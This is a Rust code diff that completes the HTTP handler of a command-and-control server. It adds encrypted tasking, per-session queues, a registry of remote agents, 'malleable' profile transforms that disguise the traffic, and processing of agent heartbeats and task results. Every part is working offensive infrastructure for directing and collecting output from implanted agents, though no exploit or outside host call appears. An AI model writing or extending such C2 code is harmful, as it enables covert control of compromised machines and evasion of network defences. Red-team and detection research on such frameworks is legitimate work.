@@ -25,24 +25,50 @@
 
 use crate::auth;
 use crate::malleable::{MultiProfileManager, TransactionTransformer};
-use crate::state::AppState;
+use crate::state::{AgentEntry, AppState};
 use axum::body::Bytes;
 use axum::extract::State;
 use axum::http::{HeaderMap, Response, StatusCode};
 use axum::response::IntoResponse;
 use axum::Router;
-use std::collections::HashMap;
+use common::{Message, PROTOCOL_VERSION};
+use dashmap::{DashMap, mapref::entry::Entry};
+use std::collections::{HashMap, VecDeque};
 use std::net::IpAddr;
-use std::sync::Arc;
+use std::sync::{Arc, Mutex};
+use tokio::sync::mpsc;
+
+struct HttpSession {
+    connection_id: String,
+    outbound_rx: mpsc::Receiver<Message>,
+    outbound_queue: VecDeque<Message>,
+}
 
 /// Shared state for the HTTP C2 handler.
 #[derive(Clone)]
 pub struct HttpC2State {
     pub profile_manager: Arc<MultiProfileManager>,
     pub app_state: Arc<AppState>,
+    /// Per-session HTTP transport state keyed by extracted session ID.
+    sessions: Arc<DashMap<String, Arc<Mutex<HttpSession>>>>,
     /// Per-IP rate limiter for C2 requests.  More permissive than the auth
     /// limiter since legitimate agents poll frequently.
     pub c2_rate_limiter: Arc<auth::PerIpRateLimiter>,
+}
+
+impl HttpC2State {
+    pub fn new(
+        profile_manager: Arc<MultiProfileManager>,
+        app_state: Arc<AppState>,
+        c2_rate_limiter: Arc<auth::PerIpRateLimiter>,
+    ) -> Self {
+        Self {
+            profile_manager,
+            app_state,
+            sessions: Arc::new(DashMap::new()),
+            c2_rate_limiter,
+        }
+    }
 }
 
 /// Build an axum Router for the HTTP C2 handler.
@@ -106,7 +132,7 @@ async fn handle_get(
     path: &str,
     uri: &str,
     headers: &HashMap<String, String>,
-    _body: &[u8],
+    body: &[u8],
 ) -> axum::response::Response {
     // Step 1: Find the matching profile and transaction.
     let (profile_name, transformer) = match find_matching_get_transformer(&state, path).await {
@@ -118,7 +144,7 @@ async fn handle_get(
 
     // Step 2: Extract session ID from metadata.
     let session_id = match transformer
-        .extract_metadata_from_headers(headers, uri, _body)
+        .extract_metadata_from_headers(headers, uri, body)
     {
         Ok(id) => id,
         Err(e) => {
@@ -128,10 +154,38 @@ async fn handle_get(
     };
 
     // Step 3: Touch the session.
+    ensure_http_session(state, &session_id);
+
     state
         .profile_manager
         .touch_session(&session_id)
         .await;
+
+    if !body.is_empty() {
+        match transformer.transform_inbound(body) {
+            Ok(decoded) => match make_transport_crypto(state).decrypt(&decoded) {
+                Ok(plaintext) => {
+                    process_task_output(&state, &session_id, &plaintext).await;
+                }
+                Err(e) => {
+                    tracing::warn!(
+                        "GET {}: decrypt failed for session '{}': {}",
+                        path,
+                        session_id,
+                        e
+                    );
+                }
+            },
+            Err(e) => {
+                tracing::warn!(
+                    "GET {}: transform_inbound failed for session '{}': {}",
+                    path,
+                    session_id,
+                    e
+                );
+            }
+        }
+    }
 
     tracing::debug!(
         "GET {} from agent session '{}' (profile '{}')",
@@ -144,22 +198,23 @@ async fn handle_get(
     let task_data = match get_pending_task(&state, &session_id).await {
         Some(data) => data,
         None => {
-            // No tasks — return an empty response with profile transform.
-            let empty = transformer.transform_outbound(&[], &session_id);
+            // No tasks pending: return an actual empty body so the agent's
+            // recv path can reliably treat this as an idle poll.
             let content_type = transformer
                 .content_type()
                 .unwrap_or("application/octet-stream");
             return (
                 StatusCode::OK,
                 [(axum::http::header::CONTENT_TYPE, content_type)],
-                Bytes::from(empty),
+                Bytes::new(),
             )
                 .into_response();
         }
     };
 
     // Step 5: Transform the tasking data through the server pipeline.
-    let response_body = transformer.transform_outbound(&task_data, &session_id);
+    let encrypted_task_data = make_transport_crypto(state).encrypt(&task_data);
+    let response_body = transformer.transform_outbound(&encrypted_task_data, &session_id);
 
     // Step 6: Build the response with profile headers.
     let content_type = transformer
@@ -218,11 +273,26 @@ async fn handle_post(
     };
 
     // Step 3: Transform and decrypt the inbound data.
+    ensure_http_session(state, &session_id);
+
     let decoded = match transformer.transform_inbound(body) {
         Ok(data) => data,
         Err(e) => {
             tracing::warn!(
                 "POST {}: transform_inbound failed for session '{}': {}",
+                path,
+                session_id,
+                e
+            );
+            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
+        }
+    };
+
+    let plaintext = match make_transport_crypto(state).decrypt(&decoded) {
+        Ok(data) => data,
+        Err(e) => {
+            tracing::warn!(
+                "POST {}: decrypt failed for session '{}': {}",
                 path,
                 session_id,
                 e
@@ -242,11 +312,11 @@ async fn handle_post(
         path,
         session_id,
         profile_name,
-        decoded.len()
+        plaintext.len()
     );
 
     // Process the task output through the app state.
-    process_task_output(&state, &session_id, &decoded).await;
+    process_task_output(&state, &session_id, &plaintext).await;
 
     // Step 5: Send a transformed acknowledgment response.
     let ack = transformer.transform_outbound(b"ACK", &session_id);
@@ -281,6 +351,74 @@ fn extract_headers(headers: &HeaderMap) -> HashMap<String, String> {
 /// then `X-Forwarded-For`, then falls back to `127.0.0.1`.
 fn extract_client_ip_from_request(req: &axum::extract::Request) -> IpAddr {
     auth::extract_client_ip(req)
+}
+
+fn now_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs()
+}
+
+fn make_transport_crypto(state: &HttpC2State) -> common::CryptoSession {
+    common::CryptoSession::from_shared_secret(state.app_state.agent_shared_secret.as_bytes())
+}
+
+fn ensure_http_session(state: &HttpC2State, session_id: &str) -> Arc<Mutex<HttpSession>> {
+    match state.sessions.entry(session_id.to_string()) {
+        Entry::Occupied(o) => o.get().clone(),
+        Entry::Vacant(v) => {
+            let connection_id = format!("http-{session_id}");
+            let (tx, rx) = mpsc::channel::<Message>(64);
+
+            let morph_seed = state.app_state.generate_unique_seed();
+            state.app_state.assigned_seeds.insert(morph_seed);
+
+            state.app_state.registry.insert(
+                connection_id.clone(),
+                AgentEntry {
+                    connection_id: connection_id.clone(),
+                    agent_id: session_id.to_string(),
+                    hostname: "http".to_string(),
+                    last_seen: now_secs(),
+                    tx,
+                    peer: format!("http/{session_id}"),
+                    morph_seed,
+                    text_hash: None,
+                    mesh_certificate: None,
+                    mesh_public_key: None,
+                    compartment: None,
+                    cert_identity: None,
+                },
+            );
+
+            let session = Arc::new(Mutex::new(HttpSession {
+                connection_id,
+                outbound_rx: rx,
+                outbound_queue: VecDeque::new(),
+            }));
+            v.insert(session.clone());
+            session
+        }
+    }
+}
+
+fn drain_outbound_queue(session: &mut HttpSession) {
+    while let Ok(msg) = session.outbound_rx.try_recv() {
+        session.outbound_queue.push_back(msg);
+    }
+}
+
+fn enqueue_outbound_message(state: &HttpC2State, session_id: &str, msg: Message) {
+    let session = ensure_http_session(state, session_id);
+    let mut guard = match session.lock() {
+        Ok(g) => g,
+        Err(poisoned) => poisoned.into_inner(),
+    };
+    guard.outbound_queue.push_back(msg);
+    if let Some(mut entry) = state.app_state.registry.get_mut(&guard.connection_id) {
+        entry.last_seen = now_secs();
+    }
 }
 
 /// Find a matching GET transformer for the given URI path.
@@ -324,43 +462,32 @@ async fn find_matching_post_transformer(
 }
 
 /// Get pending task data for a session.
-///
-/// In a full implementation, this would query the AppState's pending task
-/// queue for the given session and serialize the tasks.
 async fn get_pending_task(state: &HttpC2State, session_id: &str) -> Option<Vec<u8>> {
-    // Look up the agent by session_id (mapped to connection_id or agent_id).
-    // For now, check the pending tasks in AppState.
-    let entry = state
-        .app_state
-        .registry
-        .iter()
-        .find(|e| e.value().agent_id == session_id || e.key() == session_id)?;
+    let session = ensure_http_session(state, session_id);
+    let maybe_msg = {
+        let mut guard = match session.lock() {
+            Ok(g) => g,
+            Err(poisoned) => poisoned.into_inner(),
+        };
+        drain_outbound_queue(&mut guard);
+        guard.outbound_queue.pop_front()
+    };
 
-    // Check if there's a pending task for this agent.
-    let connection_id = entry.key().clone();
-    let tx = &entry.value().tx;
-
-    // Try to send a TaskRequest and get the response.
-    // In the full implementation, this would use the pending task channel.
-    // For now, return None to indicate no pending tasks.
-    let _ = tx;
-    drop(entry);
-
-    // Check pending map for this connection.
-    if state.app_state.pending.contains_key(&connection_id) {
-        // There's a pending response — serialize it.
-        // This is a placeholder; the actual implementation would
-        // integrate with the command dispatch system.
-        return Some(b"pending_task_data".to_vec());
+    let msg = maybe_msg?;
+    match bincode::serialize(&msg) {
+        Ok(v) => Some(v),
+        Err(e) => {
+            tracing::warn!(
+                "failed to serialize pending HTTP task for session '{}': {}",
+                session_id,
+                e
+            );
+            None
+        }
     }
-
-    None
 }
 
 /// Process task output received from an agent.
-///
-/// In a full implementation, this would deserialize the output, resolve
-/// the pending task, and forward the result to the operator.
 async fn process_task_output(state: &HttpC2State, session_id: &str, output: &[u8]) {
     tracing::info!(
         "received {} bytes of task output from session '{}'",
@@ -368,21 +495,74 @@ async fn process_task_output(state: &HttpC2State, session_id: &str, output: &[u8
         session_id
     );
 
-    // Look up the agent entry.
-    let entry = state
-        .app_state
-        .registry
-        .iter()
-        .find(|e| e.value().agent_id == session_id || e.key() == session_id);
+    let msg: Message = match bincode::deserialize(output) {
+        Ok(m) => m,
+        Err(e) => {
+            tracing::warn!(
+                "failed to deserialize HTTP C2 payload for session '{}': {}",
+                session_id,
+                e
+            );
+            return;
+        }
+    };
 
-    if let Some(entry) = entry {
-        let connection_id = entry.key().clone();
-        drop(entry);
+    match msg {
+        Message::Heartbeat {
+            agent_id,
+            status,
+            timestamp: _,
+            mesh_public_key,
+        } => {
+            let session = ensure_http_session(state, session_id);
+            let connection_id = {
+                let guard = match session.lock() {
+                    Ok(g) => g,
+                    Err(poisoned) => poisoned.into_inner(),
+                };
+                guard.connection_id.clone()
+            };
 
-        // Complete the pending task if one exists.
-        if let Some((_task_id, sender)) = state.app_state.pending.remove(&connection_id) {
-            let output_str = String::from_utf8_lossy(output).to_string();
-            let _ = sender.send(Ok(output_str));
+            if let Some(mut entry) = state.app_state.registry.get_mut(&connection_id) {
+                entry.agent_id = agent_id;
+                entry.hostname = status;
+                entry.last_seen = now_secs();
+                entry.mesh_public_key = mesh_public_key;
+            }
+        }
+        Message::VersionHandshake { version } => {
+            if version != PROTOCOL_VERSION {
+                tracing::warn!(
+                    session_id = %session_id,
+                    agent_version = version,
+                    server_version = PROTOCOL_VERSION,
+                    "HTTP C2 agent/server protocol version mismatch"
+                );
+            }
+            enqueue_outbound_message(
+                state,
+                session_id,
+                Message::VersionHandshake {
+                    version: PROTOCOL_VERSION,
+                },
+            );
+        }
+        Message::TaskResponse { task_id, result, .. } => {
+            if let Some((_, sender)) = state.app_state.pending.remove(&task_id) {
+                let _ = sender.send(result);
+            } else {
+                tracing::debug!(%task_id, "received TaskResponse with no pending waiter");
+            }
+        }
+        Message::AuditLog(ev) => {
+            state.app_state.audit.record(ev);
+        }
+        other => {
+            tracing::debug!(
+                session_id = %session_id,
+                message = ?other,
+                "ignoring HTTP C2 agent->server message variant"
+            );
         }
     }
 }
